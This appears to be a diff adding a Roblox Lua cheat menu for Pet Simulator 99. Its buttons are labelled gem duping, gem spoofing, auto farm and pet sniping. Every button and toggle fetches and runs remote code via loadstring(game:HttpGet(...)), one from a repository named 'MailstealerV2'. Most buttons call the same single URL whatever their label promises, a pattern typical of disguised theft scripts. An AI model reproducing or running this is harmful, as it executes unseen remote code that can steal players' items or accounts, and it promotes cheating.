@@ -1,0 +1,391 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "PS99 VISUAL SCRIPTS", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+
+
+--[[
+
+Name = <string> - The name of the UI.
+
+HidePremium = <bool> - Whether or not the user details shows Premium status or not.
+
+SaveConfig = <bool> - Toggles the config saving in the UI.
+
+ConfigFolder = <string> - The name of the folder where the configs are saved.
+
+IntroEnabled = <bool> - Whether or not to show the intro animation.
+
+IntroText = <string> - Text to show in the intro animation.
+
+IntroIcon = <string> - URL to the image you want to use in the intro animation.
+
+Icon = <string> - URL to the image you want displayed on the window.
+
+CloseCallback = <function> - Function to execute when the window is closed.
+
+]]
+
+
+
+local Tab = Window:MakeTab({
+
+	Name = "SCRIPTS HUB",
+
+	Icon = "rbxassetid://4483345998",
+
+	PremiumOnly = false
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the tab.
+
+Icon = <string> - The icon of the tab.
+
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+
+]]
+
+
+
+
+
+Tab:AddButton({
+
+	Name = "VISUAL SCRIPTS",
+
+	Callback = function()
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/VisualHub/main/VisualPets"))()
+
+      		print("button pressed")
+
+  	end    
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the button.
+
+Callback = <function> - The function of the button.
+
+]]
+
+
+
+
+
+Tab:AddToggle({
+
+	Name = "Auto Farm",
+
+	Default = false,
+
+	Callback = function(Value)
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
+
+		print(Value)
+
+	end    
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the toggle.
+
+Default = <bool> - The default value of the toggle.
+
+Callback = <function> - The function of the toggle.
+
+]]
+
+
+
+
+
+Tab:AddButton({
+
+	Name = "AUTO CLAIM SOCIAL REWARD",
+
+	Callback = function()
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
+
+      		print("button pressed")
+
+  	end    
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the button.
+
+Callback = <function> - The function of the button.
+
+]]
+
+
+
+Tab:AddButton({
+
+	Name = "AUTO CLAIM GROUP REWARD",
+
+	Callback = function()
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
+
+      		print("button pressed")
+
+  	end    
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the button.
+
+Callback = <function> - The function of the button.
+
+]]
+
+
+
+
+
+
+
+Tab:AddButton({
+
+	Name = "AUTO CLAIM VIP REWARDS",
+
+	Callback = function()
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
+
+      		print("button pressed")
+
+  	end    
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the button.
+
+Callback = <function> - The function of the button.
+
+]]
+
+
+
+
+
+Tab:AddButton({
+
+	Name = "AUTO CLAIM FREE GEMS",
+
+	Callback = function()
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
+
+      		print("button pressed")
+
+  	end    
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the button.
+
+Callback = <function> - The function of the button.
+
+]]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local Tab = Window:MakeTab({
+
+	Name = "Trading Plaza HUB",
+
+	Icon = "rbxassetid://4483345998",
+
+	PremiumOnly = false
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the tab.
+
+Icon = <string> - The icon of the tab.
+
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+
+]]
+
+
+
+
+
+Tab:AddButton({
+
+	Name = "Booth Gem Dupe",
+
+	Callback = function()
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
+
+      		print("button pressed")
+
+  	end    
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the button.
+
+Callback = <function> - The function of the button.
+
+]]
+
+
+
+
+
+Tab:AddToggle({
+
+	Name = "Auto Snipe Huge/Exclusive/Egg/....",
+
+	Default = false,
+
+	Callback = function(Value)
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
+
+		print(Value)
+
+	end    
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the toggle.
+
+Default = <bool> - The default value of the toggle.
+
+Callback = <function> - The function of the toggle.
+
+]]
+
+
+
+
+
+
+
+Tab:AddButton({
+
+	Name = "AUTO SNIPE TITANIC",
+
+	Callback = function()
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
+
+      		print("button pressed")
+
+  	end    
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the button.
+
+Callback = <function> - The function of the button.
+
+]]
+
+
+
+
+
+Tab:AddToggle({
+
+	Name = "Gem SPOOFING",
+
+	Default = false,
+
+	Callback = function(Value)
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AAstraX/PS99KiruSCRIPTS/Scripts/PS99SCRIPTSHUB"))()
+
+		print(Value)
+
+	end    
+
+})
+
+
+
+--[[
+
+Name = <string> - The name of the toggle.
+
+Default = <bool> - The default value of the toggle.
+
+Callback = <function> - The function of the toggle.
+
+]]
